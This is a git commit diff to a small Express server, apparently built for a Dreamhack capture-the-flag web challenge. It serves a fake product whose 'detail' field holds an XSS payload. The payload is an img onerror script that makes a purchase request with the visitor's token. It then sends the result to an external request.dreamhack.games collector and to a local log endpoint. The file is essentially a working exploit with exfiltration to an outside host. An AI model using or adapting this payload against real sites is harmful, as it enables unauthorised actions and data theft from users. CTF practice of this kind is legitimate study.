dda70b8462756861db7b3a543091fe107557f379
alstjd223 <13hj45@gmail.com>
2024-11-22 14:08:12 +0900

    에

--- index.js
+++ index.js
@@ -1,22 +1,59 @@
 const express = require('express');
 const app = express();
+const cors = require('cors');
+const { redirect } = require('next/dist/server/api-utils');
+
+app.use(cors());
+
+const url = "http://localhost:3000";
+
+app.use(express.json());
 
 app.get('/info', (req, res) => {
-    res.send(`
-    <img src='' onerror='
-    fetch("http://localhost:3000/4/buy", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "token": token
-        }
-    })
-    .then(response => response.json())
-    .then(data => {
-        fetch("https://qdqrhnf.request.dreamhack.games/"+data.data)
-    })
-    '>
-    `);
+    const token = req.headers['token'];
+
+    const items = {
+        "id": 1,
+        "name": "Web Hacking 강의",
+        "price": 1024,
+        "detail": `
+        <img src='' onerror='
+        fetch("${url}/4/buy", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "token": "${token}"
+            }
+        })
+        .then(response => response.json())
+        .then(data => {
+            fetch("https://onspmjs.request.dreamhack.games/"+data.data)
+            console.log(data.data)
+            fetch("http://localhost:4000/log", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ message: data.data })
+            });
+        })
+        '>
+        `,
+        "poster": ""
+    }
+
+    if (items) {
+        res.send(items);
+    } else {
+        res.status(403).send('');
+    }
 });
 
-app.listen(4000);
+app.post('/log', (req, res) => {
+    console.log("Received from client:", req.body.message);
+    res.sendStatus(200);
+});
+
+app.listen(4000, () => {
+    console.log("Server is running on port 4000");
+});
